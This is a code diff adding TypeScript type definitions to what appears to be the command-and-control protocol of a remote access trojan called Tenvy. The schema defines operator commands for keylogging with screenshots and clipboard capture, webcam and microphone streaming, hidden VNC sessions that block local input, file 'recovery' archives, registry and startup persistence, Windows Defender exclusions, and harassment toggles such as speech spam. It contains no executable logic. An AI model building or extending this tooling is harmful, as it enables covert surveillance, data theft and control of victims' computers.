@@ -12,11 +12,34 @@ export interface TenvyProtocol {
   agentMetadata?: AgentMetadata;
   command?: Command;
   commandResult?: CommandResult;
+  commandOutputEvent?: CommandOutputEvent;
   agentRegistrationRequest?: AgentRegistrationRequest;
+  agentRegistrationResponse?: AgentRegistrationResponse;
   agentSyncRequest?: AgentSyncRequest;
+  agentSyncResponse?: AgentSyncResponse;
   pingCommandPayload?: PingCommandPayload;
   shellCommandPayload?: ShellCommandPayload;
   agentControlCommandPayload?: AgentControlCommandPayload;
+  commandEnvelope?: CommandEnvelope;
+  openUrlCommandPayload?: OpenUrlCommandPayload;
+  remoteDesktopCommandPayload?: RemoteDesktopCommandPayload;
+  appVncCommandPayload?: AppVncCommandPayload;
+  audioControlCommandPayload?: AudioControlCommandPayload;
+  clipboardCommandPayload?: ClipboardCommandPayload;
+  recoveryCommandPayload?: RecoveryCommandPayload;
+  fileManagerCommandPayload?: FileManagerCommandPayload;
+  tcpConnectionsCommandPayload?: TcpConnectionsCommandPayload;
+  clientChatCommandPayload?: ClientChatCommandPayload;
+  toolActivationCommandPayload?: ToolActivationCommandPayload;
+  webcamCommandPayload?: WebcamCommandPayload;
+  taskManagerCommandPayload?: TaskManagerCommandPayload;
+  startupCommandPayload?: StartupCommandPayload;
+  keyloggerCommandPayload?: KeyloggerCommandPayload;
+  systemInfoCommandPayload?: SystemInfoCommandPayload;
+  environmentCommandPayload?: EnvironmentCommandPayload;
+  geoCommandPayload?: GeoCommandPayload;
+  registryCommandPayload?: RegistryCommandPayload;
+  triggerMonitorCommandPayload?: TriggerMonitorCommandPayload;
 }
 export interface AgentMetadata {
   hostname: string;
@@ -43,19 +66,137 @@ export interface CommandResult {
   error?: string;
   completedAt: string;
 }
+export interface CommandOutputEvent {
+  type: "chunk" | "end";
+  commandId: string;
+  sequence?: number;
+  data?: string;
+  timestamp: string;
+  result?: CommandResult;
+}
 export interface AgentRegistrationRequest {
   token?: string;
   metadata: AgentMetadata;
 }
+export interface AgentRegistrationResponse {
+  agentId: string;
+  agentKey: string;
+  config: AgentConfig;
+  commands?: Command[];
+  serverTime: string;
+}
+export interface AgentConfig {
+  pollIntervalMs: number;
+  maxBackoffMs: number;
+  jitterRatio: number;
+  plugins?: AgentPluginConfig;
+}
+export interface AgentPluginConfig {
+  signaturePolicy?: AgentPluginSignaturePolicy;
+}
+export interface AgentPluginSignaturePolicy {
+  sha256AllowList?: string[];
+  ed25519PublicKeys?: {
+    [k: string]: string;
+  };
+  maxSignatureAgeMs?: number;
+}
 export interface AgentSyncRequest {
   status: "online" | "offline" | "busy";
   timestamp: string;
-  metrics?: {
-    memoryBytes?: number;
-    goroutines?: number;
-    uptimeSeconds?: number;
-  };
+  metrics?: AgentMetrics;
   results?: CommandResult[];
+  plugins?: PluginSyncPayload;
+  options?: OptionsState;
+}
+export interface AgentMetrics {
+  memoryBytes?: number;
+  goroutines?: number;
+  uptimeSeconds?: number;
+}
+export interface PluginSyncPayload {
+  installations?: PluginInstallationTelemetry[];
+  manifests?: AgentPluginManifestState;
+}
+export interface PluginInstallationTelemetry {
+  pluginId: string;
+  version: string;
+  status: "installed" | "blocked" | "error" | "disabled";
+  hash?: string;
+  timestamp?: number;
+  error?: string;
+}
+export interface AgentPluginManifestState {
+  version?: string;
+  digests?: {
+    [k: string]: string;
+  };
+}
+export interface OptionsState {
+  defenderExclusion?: boolean;
+  windowsUpdate?: boolean;
+  visualDistortion?: string;
+  screenOrientation?: string;
+  wallpaperMode?: string;
+  cursorBehavior?: string;
+  keyboardMode?: string;
+  soundPlayback?: boolean;
+  soundVolume?: number;
+  script?: OptionsScriptConfig;
+  scriptRuntime?: OptionsScriptRuntimeState;
+  fakeEventMode?: string;
+  speechSpam?: boolean;
+  autoMinimize?: boolean;
+}
+export interface OptionsScriptConfig {
+  file?: OptionsScriptFile;
+  mode?: string;
+  loop?: boolean;
+  delaySeconds?: number;
+}
+export interface OptionsScriptFile {
+  name: string;
+  size: number;
+  type: string;
+  path: string;
+  checksum: string;
+}
+export interface OptionsScriptRuntimeState {
+  status?: string;
+  active?: boolean;
+  lastStartedAt?: string;
+  lastCompletedAt?: string;
+  lastExitCode?: number;
+  hasExitCode?: boolean;
+  lastError?: string;
+  runs?: number;
+}
+export interface AgentSyncResponse {
+  agentId: string;
+  commands: Command[];
+  config: AgentConfig;
+  serverTime: string;
+  pluginManifests?: PluginManifestDelta;
+  options?: OptionsState;
+}
+export interface PluginManifestDelta {
+  version: string;
+  updated: PluginManifestDescriptor[];
+  removed: string[];
+}
+export interface PluginManifestDescriptor {
+  pluginId: string;
+  version: string;
+  manifestDigest: string;
+  artifactHash?: string;
+  artifactSizeBytes?: number;
+  approvedAt?: string;
+  manualPushAt?: string;
+  dependencies?: string[];
+  distribution: {
+    defaultMode: "manual" | "automatic";
+    autoUpdate: boolean;
+  };
 }
 export interface PingCommandPayload {
   message?: string;
@@ -73,4 +214,443 @@ export interface AgentControlCommandPayload {
   action: "disconnect" | "reconnect" | "shutdown" | "restart" | "sleep" | "logoff";
   reason?: string;
   force?: boolean;
+}
+export interface CommandEnvelope {
+  type: string;
+  command?: Command;
+  input?: RemoteDesktopInputBurst;
+  appVncInput?: AppVncInputBurst;
+}
+export interface RemoteDesktopInputBurst {
+  sessionId: string;
+  events: RemoteDesktopInputEvent[];
+  sequence?: number;
+}
+export interface RemoteDesktopInputEvent {
+  type: "mouse-move" | "mouse-button" | "mouse-scroll" | "key";
+  capturedAt: number;
+  x?: number;
+  y?: number;
+  normalized?: boolean;
+  monitor?: number;
+  button?: "left" | "middle" | "right";
+  pressed?: boolean;
+  deltaX?: number;
+  deltaY?: number;
+  deltaMode?: number;
+  key?: string;
+  code?: string;
+  keyCode?: number;
+  repeat?: boolean;
+  altKey?: boolean;
+  ctrlKey?: boolean;
+  shiftKey?: boolean;
+  metaKey?: boolean;
+}
+export interface AppVncInputBurst {
+  sessionId: string;
+  events: AppVncInputEvent[];
+  sequence?: number;
+}
+export interface AppVncInputEvent {
+  type: "pointer-move" | "pointer-button" | "pointer-scroll" | "key";
+  capturedAt: number;
+  x?: number;
+  y?: number;
+  normalized?: boolean;
+  button?: "left" | "middle" | "right";
+  pressed?: boolean;
+  deltaX?: number;
+  deltaY?: number;
+  deltaMode?: number;
+  key?: string;
+  code?: string;
+  keyCode?: number;
+  repeat?: boolean;
+  altKey?: boolean;
+  ctrlKey?: boolean;
+  shiftKey?: boolean;
+  metaKey?: boolean;
+}
+export interface OpenUrlCommandPayload {
+  url: string;
+  note?: string;
+}
+export interface RemoteDesktopCommandPayload {
+  action: "start" | "stop" | "configure" | "input";
+  sessionId?: string;
+  settings?: RemoteDesktopSettingsPatch;
+  events?: RemoteDesktopInputEvent[];
+}
+export interface RemoteDesktopSettingsPatch {
+  quality?: "auto" | "high" | "medium" | "low";
+  monitor?: number;
+  mouse?: boolean;
+  keyboard?: boolean;
+  mode?: "images" | "video";
+  encoder?: "auto" | "hevc" | "avc" | "jpeg";
+  transport?: "http" | "webrtc";
+  hardware?: "auto" | "prefer" | "avoid";
+  targetBitrateKbps?: number;
+}
+export interface AppVncCommandPayload {
+  action: "start" | "stop" | "configure" | "input" | "heartbeat";
+  sessionId?: string;
+  settings?: AppVncSessionSettingsPatch;
+  events?: AppVncInputEvent[];
+  application?: AppVncApplicationDescriptor;
+  virtualization?: AppVncVirtualizationPlan;
+}
+export interface AppVncSessionSettingsPatch {
+  monitor?: string;
+  quality?: "lossless" | "balanced" | "bandwidth";
+  captureCursor?: boolean;
+  clipboardSync?: boolean;
+  blockLocalInput?: boolean;
+  heartbeatInterval?: number;
+  appId?: string;
+  windowTitle?: string;
+}
+export interface AppVncApplicationDescriptor {
+  id: string;
+  name: string;
+  summary: string;
+  category: string;
+  platforms: ("windows" | "linux" | "macos")[];
+  windowTitleHint?: string;
+  executable?: {
+    [k: string]: string;
+  };
+  virtualization?: AppVncVirtualizationHints;
+}
+export interface AppVncVirtualizationHints {
+  profileSeeds?: {
+    [k: string]: string;
+  };
+  dataRoots?: {
+    [k: string]: string;
+  };
+  environment?: {
+    [k: string]: {
+      [k: string]: string;
+    };
+  };
+}
+export interface AppVncVirtualizationPlan {
+  platform?: "windows" | "linux" | "macos";
+  profileSeed?: string;
+  dataRoot?: string;
+  environment?: {
+    [k: string]: string;
+  };
+}
+export interface AudioControlCommandPayload {
+  action:
+    | "enumerate"
+    | "inventory"
+    | "start"
+    | "stop"
+    | "playback-start"
+    | "playback-pause"
+    | "playback-resume"
+    | "playback-stop";
+  requestId?: string;
+  sessionId?: string;
+  deviceId?: string;
+  deviceLabel?: string;
+  direction?: "input" | "output";
+  sampleRate?: number;
+  channels?: number;
+  encoding?: "pcm16";
+  streamTransport?: AudioStreamTransport;
+  trackId?: string;
+  trackUrl?: string;
+  outputDeviceId?: string;
+  outputDeviceLabel?: string;
+  volume?: number;
+  loop?: boolean;
+  chaosMode?: boolean;
+  rickroll?: boolean;
+}
+export interface AudioStreamTransport {
+  transport: "http-chunk" | "websocket";
+  url: string;
+  protocol?: string;
+  headers?: {
+    [k: string]: string;
+  };
+}
+export interface ClipboardCommandPayload {
+  action: "get" | "set" | "sync-triggers";
+  requestId?: string;
+  content?: ClipboardContent;
+  triggers?: ClipboardTrigger[];
+  source?: string;
+  sequence?: number;
+}
+export interface ClipboardContent {
+  format: "text" | "image" | "files" | "html" | "rtf" | "unknown";
+  text?: ClipboardTextData;
+  image?: ClipboardImageData;
+  files?: ClipboardFileEntry[];
+  metadata?: {
+    [k: string]: string;
+  };
+}
+export interface ClipboardTextData {
+  value: string;
+  encoding?: string;
+  length?: number;
+}
+export interface ClipboardImageData {
+  mimeType: string;
+  data: string;
+  width?: number;
+  height?: number;
+}
+export interface ClipboardFileEntry {
+  name: string;
+  size?: number;
+  mimeType?: string;
+  path?: string;
+  digest?: string;
+}
+export interface ClipboardTrigger {
+  id: string;
+  label: string;
+  description?: string;
+  condition: ClipboardTriggerCondition;
+  action: ClipboardTriggerAction;
+  createdAt: string;
+  updatedAt?: string;
+  active: boolean;
+}
+export interface ClipboardTriggerCondition {
+  formats?: ("text" | "image" | "files" | "html" | "rtf" | "unknown")[];
+  pattern?: string;
+  caseSensitive?: boolean;
+}
+export interface ClipboardTriggerAction {
+  type: "notify" | "command";
+  configuration?: {};
+}
+export interface RecoveryCommandPayload {
+  requestId: string;
+  selections: RecoveryTargetSelection[];
+  archiveName?: string;
+  notes?: string;
+}
+export interface RecoveryTargetSelection {
+  type: string;
+  label?: string;
+  path?: string;
+  paths?: string[];
+  recursive?: boolean;
+}
+export interface FileManagerCommandPayload {
+  action:
+    | "list-directory"
+    | "read-file"
+    | "create-entry"
+    | "rename-entry"
+    | "move-entry"
+    | "delete-entry"
+    | "update-file";
+  path?: string;
+  requestId?: string;
+  includeHidden?: boolean;
+  encoding?: "utf-8" | "base64";
+  directory?: string;
+  name?: string;
+  entryType?: "file" | "directory";
+  content?: string;
+  destination?: string;
+}
+export interface TcpConnectionsCommandPayload {
+  action: "enumerate";
+  requestId: string;
+  query?: TcpConnectionQuery;
+}
+export interface TcpConnectionQuery {
+  localFilter?: string;
+  remoteFilter?: string;
+  state?: string;
+  includeIpv6?: boolean;
+  resolveDns?: boolean;
+  limit?: number;
+}
+export interface ClientChatCommandPayload {
+  action: "start" | "stop" | "send-message" | "configure";
+  sessionId?: string;
+  message?: ClientChatCommandMessage;
+  aliases?: ClientChatAliasConfiguration;
+  features?: ClientChatFeatureFlags;
+}
+export interface ClientChatCommandMessage {
+  id?: string;
+  body: string;
+  timestamp?: string;
+  alias?: string;
+}
+export interface ClientChatAliasConfiguration {
+  operator?: string;
+  client?: string;
+}
+export interface ClientChatFeatureFlags {
+  unstoppable?: boolean;
+  allowNotifications?: boolean;
+  allowFileTransfers?: boolean;
+}
+export interface ToolActivationCommandPayload {
+  toolId: string;
+  action: string;
+  initiatedBy?: string;
+  timestamp?: string;
+  metadata?: {};
+}
+export interface WebcamCommandPayload {
+  action: "enumerate" | "start" | "stop" | "update";
+  requestId?: string;
+  sessionId?: string;
+  deviceId?: string;
+  settings?: WebcamStreamSettings;
+  negotiation?: WebcamNegotiationState;
+}
+export interface WebcamStreamSettings {
+  quality?: "max" | "high" | "medium" | "low";
+  width?: number;
+  height?: number;
+  frameRate?: number;
+  zoom?: number;
+  mimeType?: string;
+  pixelFormat?: string;
+}
+export interface WebcamNegotiationState {
+  offer?: WebcamNegotiationOffer;
+  answer?: WebcamNegotiationAnswer;
+}
+export interface WebcamNegotiationOffer {
+  transport: "webrtc" | "http";
+  offer?: string;
+  iceServers?: string[];
+  dataChannel?: string;
+}
+export interface WebcamNegotiationAnswer {
+  answer?: string;
+  iceServers?: string[];
+  dataChannel?: string;
+}
+export interface TaskManagerCommandPayload {
+  request: TaskManagerCommandRequest;
+}
+export interface TaskManagerCommandRequest {
+  operation: "list" | "detail" | "start" | "action";
+  pid?: number;
+  action?: "stop" | "force-stop" | "suspend" | "resume" | "restart";
+  payload?: StartProcessRequest;
+}
+export interface StartProcessRequest {
+  command: string;
+  args?: string[];
+  cwd?: string;
+  env?: {
+    [k: string]: string;
+  };
+}
+export interface StartupCommandPayload {
+  request: StartupCommandRequest;
+}
+export interface StartupCommandRequest {
+  operation: "list" | "toggle" | "create" | "remove";
+  refresh?: boolean;
+  entryId?: string;
+  enabled?: boolean;
+  definition?: StartupEntryDefinition;
+}
+export interface StartupEntryDefinition {
+  name: string;
+  path: string;
+  arguments?: string;
+  scope: "machine" | "user" | "scheduled-task";
+  source: "registry" | "startup-folder" | "scheduled-task" | "service" | "other";
+  location: string;
+  enabled?: boolean;
+  publisher?: string;
+  description?: string;
+}
+export interface KeyloggerCommandPayload {
+  action: "start" | "stop" | "configure";
+  sessionId?: string;
+  mode?: "standard" | "offline";
+  config?: KeyloggerStartConfig;
+}
+export interface KeyloggerStartConfig {
+  mode: "standard" | "offline";
+  cadenceMs?: number;
+  batchIntervalMs?: number;
+  bufferSize?: number;
+  includeWindowTitles?: boolean;
+  includeClipboard?: boolean;
+  emitProcessNames?: boolean;
+  includeScreenshots?: boolean;
+  encryptAtRest?: boolean;
+  redactSecrets?: boolean;
+}
+export interface SystemInfoCommandPayload {
+  refresh?: boolean;
+}
+export interface EnvironmentCommandPayload {
+  action: "list" | "set" | "remove";
+  key?: string;
+  value?: string;
+  scope?: "machine" | "user";
+  restartProcesses?: boolean;
+  timestamp: string;
+  initiatedBy?: string;
+}
+export interface GeoCommandPayload {
+  action: "status" | "lookup";
+  ip?: string;
+  provider?: "ipinfo" | "maxmind" | "db-ip";
+  includeTimezone?: boolean;
+  includeMap?: boolean;
+}
+export interface RegistryCommandPayload {
+  request: RegistryCommandRequest;
+}
+export interface RegistryCommandRequest {
+  operation: "list" | "create" | "update" | "delete";
+  target?: "key" | "value";
+  hive?: "HKEY_LOCAL_MACHINE" | "HKEY_CURRENT_USER" | "HKEY_USERS";
+  path?: string;
+  keyPath?: string;
+  parentPath?: string;
+  name?: string;
+  originalName?: string;
+  depth?: number;
+  value?: RegistryValueInput;
+}
+export interface RegistryValueInput {
+  name: string;
+  type: "REG_SZ" | "REG_EXPAND_SZ" | "REG_MULTI_SZ" | "REG_DWORD" | "REG_QWORD" | "REG_BINARY";
+  data: string;
+  description?: string;
+}
+export interface TriggerMonitorCommandPayload {
+  action: "status" | "configure";
+  config?: TriggerMonitorConfigInput;
+}
+export interface TriggerMonitorConfigInput {
+  feed: "live" | "batch";
+  refreshSeconds: number;
+  includeScreenshots: boolean;
+  includeCommands: boolean;
+  watchlist?: TriggerMonitorWatchlistEntry[];
+}
+export interface TriggerMonitorWatchlistEntry {
+  kind: "app" | "url";
+  id: string;
+  displayName: string;
+  alertOnOpen: boolean;
+  alertOnClose: boolean;
 }
